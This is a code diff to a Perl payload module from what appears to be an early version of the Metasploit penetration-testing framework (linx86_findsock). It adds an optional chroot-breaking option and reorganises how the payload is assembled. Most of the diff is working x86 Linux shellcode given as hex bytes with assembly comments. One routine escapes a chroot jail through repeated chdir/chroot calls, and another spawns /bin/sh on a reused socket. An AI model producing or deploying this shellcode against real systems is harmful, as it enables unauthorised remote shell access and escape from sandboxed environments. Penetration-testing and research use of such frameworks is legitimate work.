@@ -11,6 +11,10 @@ package Msf::Payload::linx86_findsock;
 use strict;
 use base 'Msf::PayloadComponent::FindConnection';
 
+my $advanced = {
+  'ChrootBreak' => [1, 'Enable chroot breaking mkdir/chroot/chdir/chroot'],
+};
+
 my $info =
 {
   'Name'         => 'linx86findsock',
@@ -30,11 +34,18 @@ my $info =
 sub new {
   my $class = shift;
   my $hash = @_ ? shift : { };
-  $hash = $class->MergeHash($hash, {'Info' => $info});
+  $hash = $class->MergeHash($hash, {'Info' => $info, 'Advanced' => $advanced,});
   my $self = $class->SUPER::new($hash, @_);
 
   $self->_Info->{'Size'} = $self->_GenSize;
   return($self);
+}
+
+sub Size {
+  my $self = shift;
+  my $size = $self->SUPER::Size;
+  $size += length($self->_ChrootCode) if($self->GetLocal('ChrootBreak'));
+  return($size);
 }
 
 sub Build {
@@ -45,6 +56,7 @@ sub Build {
 sub Generate {
   my $self = shift;
   my $port = shift;
+  my $chroot = @_ ? shift : $self->GetLocal('ChrootBreak');
   my $off_port = 46;
   my $port_bin = pack('n', $port);
 
@@ -90,7 +102,28 @@ sub Generate {
   "\x31\xdb"             . # /* xorl    %ebx,%ebx              */
   "\xb0\x17"             . # /* movb    $0x17,%al              */
   "\xcd\x80"             . # /* int     $0x80                  */
+  ($chroot ? $self->_ChrootCode : '') .
+  
+  # char shellcode[]=    . # /* 24 bytes                       */
+  "\x31\xc0"             . # /* xorl    %eax,%eax              */
+  "\x50"                 . # /* pushl   %eax                   */
+  "\x68//sh"             . # /* pushl   $0x68732f2f            */
+  "\x68/bin"             . # /* pushl   $0x6e69622f            */
+  "\x89\xe3"             . # /* movl    %esp,%ebx              */
+  "\x50"                 . # /* pushl   %eax                   */
+  "\x53"                 . # /* pushl   %ebx                   */
+  "\x89\xe1"             . # /* movl    %esp,%ecx              */
+  "\x99"                 . # /* cdql                           */
+  "\xb0\x0b"             . # /* movb    $0x0b,%al              */
+  "\xcd\x80"             ; # /* int     $0x80                  */
 
+  substr($shellcode, $off_port, 2, $port_bin);
+  return($shellcode);
+}
+
+sub _ChrootCode {
+  my $self = shift;
+  my $shellcode =
   # char chrootcode[]=     # /* 37 bytes                       */
   "\x33\xc0"             . # /* xorl    %eax,%eax              */
   "\x50"                 . # /* pushl   %eax                   */
@@ -110,28 +143,13 @@ sub Generate {
   "\xe2\xfa"             . # /* loop    <chrootcode+21>        */
   "\x43"                 . # /* incl    %ebx                   */
   "\xb0\x3d"             . # /* movb    $0x3d,%al              */
-  "\xcd\x80"             . # /* int     $0x80                  */
-  
-  # char shellcode[]=    . # /* 24 bytes                       */
-  "\x31\xc0"             . # /* xorl    %eax,%eax              */
-  "\x50"                 . # /* pushl   %eax                   */
-  "\x68//sh"             . # /* pushl   $0x68732f2f            */
-  "\x68/bin"             . # /* pushl   $0x6e69622f            */
-  "\x89\xe3"             . # /* movl    %esp,%ebx              */
-  "\x50"                 . # /* pushl   %eax                   */
-  "\x53"                 . # /* pushl   %ebx                   */
-  "\x89\xe1"             . # /* movl    %esp,%ecx              */
-  "\x99"                 . # /* cdql                           */
-  "\xb0\x0b"             . # /* movb    $0x0b,%al              */
   "\xcd\x80"             ; # /* int     $0x80                  */
-
-  substr($shellcode, $off_port, 2, $port_bin);
   return($shellcode);
 }
 
 sub _GenSize {
   my $self = shift;
-  my $bin = $self->Generate('4444');
+  my $bin = $self->Generate('4444', 0);
   return(length($bin));
 }
 
